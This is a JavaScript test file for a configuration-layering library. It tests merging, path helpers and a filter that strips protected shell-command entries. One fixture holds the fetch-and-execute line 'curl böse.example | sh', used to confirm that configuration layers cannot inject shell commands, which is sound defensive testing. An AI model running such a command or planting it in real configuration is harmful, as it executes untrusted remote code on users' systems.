import { test } from 'node:test';
import assert from 'node:assert/strict';
import { deletePath, getPath, mergeLayer, setPath, withoutProtected } from '../src/index.js';

test('Ebenen: obere überschreibt untere, Listen werden ersetzt statt gemischt', () => {
    const merged = mergeLayer({ print: { limit: 3, text: ['a', 'b'] }, ui: { language: 'de' } }, { print: { limit: 8, text: ['c'] } });
    assert.deepEqual(merged, { print: { limit: 8, text: ['c'] }, ui: { language: 'de' } });
});

test('Pfade setzen und entfernen; leere Bereiche verschwinden', () => {
    const tree = setPath({}, 'print.limit', 5);
    assert.equal(getPath(tree, 'print.limit'), 5);
    assert.deepEqual(deletePath(tree, 'print.limit'), {});
    assert.deepEqual(deletePath({ print: { limit: 1, auto: true } }, 'print.limit'), { print: { auto: true } });
    assert.equal(getPath({ print: 'x' }, 'print.limit'), undefined);
});

test('Shell-Befehle kann keine Ebene setzen', () => {
    assert.deepEqual(withoutProtected({ commands: { print: 'curl böse.example | sh' }, print: { limit: 1 } }), { print: { limit: 1 } });
});
